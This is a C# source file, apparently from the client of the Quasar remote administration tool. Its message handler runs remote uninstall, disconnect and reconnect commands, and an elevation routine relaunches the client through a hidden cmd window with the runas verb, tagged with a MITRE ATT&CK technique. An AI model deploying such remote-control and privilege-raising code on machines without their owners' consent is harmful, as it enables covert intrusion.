using Quasar.Client.Config;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly QuasarClient _client;

        private readonly QuasarApplication _application;

        public ClientServicesHandler(QuasarApplication application, QuasarClient client)
        {
            _application = application;
            _client = client;
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            Logger.Debug("Handling client uninstall message.");
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                Logger.Error("Error handling client uninstall message: " + ex.ToString());
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            Logger.Debug("Handling client disconnect message.");
            _client.Exit();
            Logger.Debug("Disconnected.");
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            Logger.Debug("Handling client reconnect message.");
            _client.Disconnect();
        }

        /// <summary>
        /// If the client is running in a non-elevated context, will restart in an elevated context via cmd and runas verb
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1059.003: Command and Scripting Interpreter: Windows Command Shell
        /// </remarks>
        private void Execute(ISender client, DoAskElevate message)
        {
            Logger.Debug("Handling client elevation request message.");
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                Logger.Debug("Client is not currently running in an elevated context - attempting to restart in an elevated context.");
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch (Exception ex)
                {
                    Logger.Error("Error when elevating client: " + ex.ToString());
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                Logger.Debug("Started elevated client process. Exiting this client.");
                _client.Exit();
            }
            else
            {
                Logger.Debug("Client already elevated.");
                client.Send(new SetStatus { Message = "Process already elevated." });
            }
        }
    }
}
